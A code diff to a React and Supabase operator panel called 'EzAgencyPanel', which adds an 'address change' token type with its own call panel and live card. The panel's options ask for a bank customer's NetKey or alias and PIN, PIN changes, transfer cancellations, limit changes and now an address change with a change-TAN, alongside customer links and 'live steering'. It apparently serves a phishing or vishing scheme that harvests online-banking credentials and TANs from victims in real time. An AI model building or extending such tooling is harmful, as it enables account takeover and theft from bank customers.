@@ -3,22 +3,24 @@ import { supabase } from "@/integrations/supabase/client";
 import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
-import { Ban, Sliders, KeyRound, Mail, Trash2, Plus, Send, Phone, ShieldCheck, MessageSquare } from "lucide-react";
+import { Ban, Sliders, KeyRound, Mail, Trash2, Plus, Send, Phone, ShieldCheck, MessageSquare, MapPin } from "lucide-react";
 import { toast } from "sonner";
 import StornoCallPanel from "./StornoCallPanel";
 import LimitCallPanel from "./LimitCallPanel";
 import PinCallPanel from "./PinCallPanel";
 import AuthCallPanel from "./AuthCallPanel";
+import AdressCallPanel from "./AdressCallPanel";
 import UnifiedTokensList from "./UnifiedTokensList";
 import AuthLiveCard from "./AuthLiveCard";
 import StornoLiveCard from "./StornoLiveCard";
 import PinLiveCard from "./PinLiveCard";
+import AdressLiveCard from "./AdressLiveCard";
 import { getPublicBaseUrl, setPublicBaseUrl } from "@/lib/customerLink";
 
 
 
 
-type TokenKind = "storno" | "limit" | "pin" | "auth";
+type TokenKind = "storno" | "limit" | "pin" | "auth" | "adress";
 
 interface CustomEmailRow { id: string; local_part: string; domain: string; address: string; label: string | null; }
 
@@ -451,12 +453,13 @@ const EzAgencyPanel = () => {
       <Card>
         <CardHeader><CardTitle>Token-Art wählen</CardTitle></CardHeader>
         <CardContent>
-          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
+          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
             {([
               { v: "auth", Icon: ShieldCheck, label: "Kundenauthentifizierung", desc: "NetKey/Alias + PIN abfragen." },
               { v: "limit", Icon: Sliders, label: "Limit-Änderung", desc: "Überweisungs-Limit anpassen." },
               { v: "storno", Icon: Ban, label: "Storno", desc: "Überweisungswiderruf — Auftraggeber, Empfänger, Betrag." },
               { v: "pin", Icon: KeyRound, label: "PIN-Änderung", desc: "Sicherheitssperre & neue PIN." },
+              { v: "adress", Icon: MapPin, label: "Adress-Änderung", desc: "Anschrift ändern & Änderungs-TAN." },
             ] as const).map(opt => (
               <button
                 key={opt.v}
@@ -479,18 +482,20 @@ const EzAgencyPanel = () => {
       {/* Details */}
       <div>
         <div className="mb-3 text-xs uppercase tracking-wider text-muted-foreground font-semibold">
-          Details · {kind === "storno" ? "Storno" : kind === "limit" ? "Limit-Änderung" : kind === "pin" ? "PIN-Änderung" : "Kundenauthentifizierung"}
+          Details · {kind === "storno" ? "Storno" : kind === "limit" ? "Limit-Änderung" : kind === "pin" ? "PIN-Änderung" : kind === "adress" ? "Adress-Änderung" : "Kundenauthentifizierung"}
         </div>
         {kind === "storno" && <StornoCallPanel />}
         {kind === "limit" && <LimitCallPanel />}
         {kind === "pin" && <PinCallPanel />}
         {kind === "auth" && <AuthCallPanel />}
+        {kind === "adress" && <AdressCallPanel />}
       </div>
 
       {/* Live steering — always visible, regardless of selected kind */}
       <AuthLiveCard />
       <StornoLiveCard />
       <PinLiveCard />
+      <AdressLiveCard />
 
 
       {/* Active tokens */}
